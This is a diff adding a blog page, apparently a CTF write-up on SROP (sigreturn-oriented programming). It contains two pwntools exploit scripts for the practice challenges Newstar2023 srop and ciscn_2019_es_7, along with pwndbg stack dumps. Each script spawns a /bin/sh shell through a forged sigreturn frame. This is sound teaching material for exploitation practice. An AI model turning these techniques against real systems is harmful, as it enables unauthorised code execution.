@@ -1,0 +1,755 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chtholly1.jpg">
+  <link rel="icon" href="/img/chtholly1.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4c81b9">
+  <meta name="author" content="Isolator">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="exp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SROP">
+<meta property="og:url" content="https://isolator-1.github.io/2023/11/27/ctf-pwn/srop/index.html">
+<meta property="og:site_name" content="Isolator&#39;s Blog">
+<meta property="og:description" content="exp">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-11-27T06:44:00.000Z">
+<meta property="article:modified_time" content="2023-12-04T06:43:39.512Z">
+<meta property="article:author" content="Isolator">
+<meta property="article:tag" content="ctf-pwn">
+<meta property="article:tag" content="stack">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>SROP - Isolator&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"isolator-1.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>_φ_(．．) Chtholly Nota Seniorious</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/chtholly2.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SROP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-27 14:44" pubdate>
+          November 27, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SROP</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>需要syscall ret，如果没有syscall 15，就要先造一个  pop rax, ret 加 0xf 的gadget，然后在执行syscall。</p>
+<h3 id="Newstar2023-srop"><a href="#Newstar2023-srop" class="headerlink" title="Newstar2023 srop"></a>Newstar2023 srop</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/match/matches/190/challenges">https://buuoj.cn/match/matches/190/challenges</a></p>
+<p>整体思路就是先构造一个syscall 15的rop，然后在这个syscall栈下面放上一个frame，frame的rip指向syscall，然后再把需要执行的函数和参数写进其他寄存器</p>
+<p>0xf是sigreturn调用号，59是execve调用号</p>
+<p>不懂为什么syscall的调用号是在rdi上</p>
+<blockquote>
+<p>答：这道题是call syscall ，不是直接执行syscall</p>
+<p>__int64 syscall(__int64 sysno, …)<br>{<br>      return syscall(sysno);<br>}</p>
+</blockquote>
+<p>第一次send栈迁移是为了能够知道/bin/sh在哪，在原本的栈上不知道地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p=process(<span class="hljs-string">&#x27;./pwn_1&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn_1&#x27;</span>)<br><br>rdi=<span class="hljs-number">0x401203</span><br>syscall=elf.plt[<span class="hljs-string">&#x27;syscall&#x27;</span>]<br>lea=<span class="hljs-number">0x401171</span><br>bss=<span class="hljs-number">0x404050</span>+<span class="hljs-number">0x300</span> <span class="hljs-comment"># 这个0x300换成别的或者直接不加，试过也可以</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;welcome to srop!\n&#x27;</span>)<br>frame=SigreturnFrame()<br>frame.rdi=<span class="hljs-number">59</span><br>frame.rsi=bss-<span class="hljs-number">0x30</span> <span class="hljs-comment"># 原本的栈上rbp距离字符串开头是0x30字节，栈迁移过来也一样</span><br>frame.rdx=<span class="hljs-number">0</span><br>frame.rcx=<span class="hljs-number">0</span><br>frame.rsp=bss+<span class="hljs-number">0x38</span><br>frame.rip=syscall<br><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+flat(bss,lea))<br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+flat(rdi,<span class="hljs-number">0xf</span>,syscall,frame))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a>ciscn_2019_es_7</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_es_7">https://buuoj.cn/challenges#ciscn_2019_es_7</a></p>
+<p>sys_write本身泄露了栈上的地址，计算和buf输入的binsh的偏移</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.arch=&#x27;amd64&#x27;</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&quot;./ciscn_2019_es_7&quot;)</span><br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25797</span>)<br><br>syscall_ret=<span class="hljs-number">0x400517</span><br>sigreturn_addr=<span class="hljs-number">0x4004da</span> <span class="hljs-comment"># rax = 15, ret</span><br>system_addr=<span class="hljs-number">0x4004E2</span>	<span class="hljs-comment"># syscall, ret</span><br><br>rax=<span class="hljs-number">0x4004f1</span><br><br>p.send(<span class="hljs-string">b&quot;/bin/sh&quot;</span>+<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">9</span>+p64(rax))<br>p.recv(<span class="hljs-number">32</span>)<br>stack_addr=u64(p.recv(<span class="hljs-number">8</span>))<br>log.success(<span class="hljs-string">&quot;stack: &quot;</span>+<span class="hljs-built_in">hex</span>(stack_addr))<br>p.recv(<span class="hljs-number">8</span>)<br><br>sigframe = SigreturnFrame()<br>sigframe.rax = <span class="hljs-number">59</span><br>sigframe.rdi = stack_addr - <span class="hljs-number">0x118</span>  <br>sigframe.rsi = <span class="hljs-number">0x0</span><br>sigframe.rdx = <span class="hljs-number">0x0</span><br>sigframe.rsp = stack_addr<br>sigframe.rip = syscall_ret<br><br>p.send(<span class="hljs-string">b&quot;/bin/sh&quot;</span>+<span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">0x1</span>+<span class="hljs-number">0x8</span>)+p64(sigreturn_addr)+p64(syscall_ret)+<span class="hljs-built_in">bytes</span>(sigframe))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>上面的exp里binsh和泄露的地址偏移是0x118，但是在我本地是328（kali2023.3），远程是ubuntu18</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/100x <span class="hljs-number">0x7fffffffde00</span> -<span class="hljs-number">40</span><br><span class="hljs-number">0x7fffffffddd8</span>: <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x7fffffffdde8</span>: <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x31333231</span>      <span class="hljs-number">0x32313332</span> <span class="hljs-comment">#  ddf0是buf的地址</span><br><span class="hljs-number">0x7fffffffddf8</span>: <span class="hljs-number">0x00000a33</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xffffde20</span>      <span class="hljs-number">0x00007fff</span><br><span class="hljs-number">0x7fffffffde08</span>: <span class="hljs-number">0x00400536</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xffffdf38</span>      <span class="hljs-number">0x00007fff</span><br><span class="hljs-number">0x7fffffffde18</span>: <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x00000000</span><br>pwndbg&gt; stack <span class="hljs-number">30</span><br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rbp rsp <span class="hljs-number">0x7fffffffde00</span> —▸ <span class="hljs-number">0x7fffffffde20</span> ◂— <span class="hljs-number">0x1</span><br>01:0008│         <span class="hljs-number">0x7fffffffde08</span> —▸ <span class="hljs-number">0x400536</span> (main+<span class="hljs-number">25</span>) ◂— nop  <span class="hljs-comment"># ret addr</span><br>02:<span class="hljs-number">00</span>10│         <span class="hljs-number">0x7fffffffde10</span> —▸ <span class="hljs-number">0x7fffffffdf38</span> —▸ <span class="hljs-number">0x7fffffffe2af</span> ◂— <span class="hljs-string">&#x27;/home/kali/Desktop/ciscn_s_3&#x27;</span><br>03:0018│         <span class="hljs-number">0x7fffffffde18</span> ◂— <span class="hljs-number">0x100000000</span><br>04:0020│         <span class="hljs-number">0x7fffffffde20</span> ◂— <span class="hljs-number">0x1</span><br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf-pwn/" class="category-chain-item">ctf-pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf-pwn/">#ctf-pwn</a>
+      
+        <a href="/tags/stack/">#stack</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SROP</div>
+      <div>https://isolator-1.github.io/2023/11/27/ctf-pwn/srop/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Isolator</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 27, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/11/30/%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B0/HackMentor/" title="HackMentor论文复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackMentor论文复现</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/27/ctf-pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2gots%E8%A1%A8%E5%9C%B0%E5%9D%80/" title="格式化字符串修改got表">
+                        <span class="hidden-mobile">格式化字符串修改got表</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
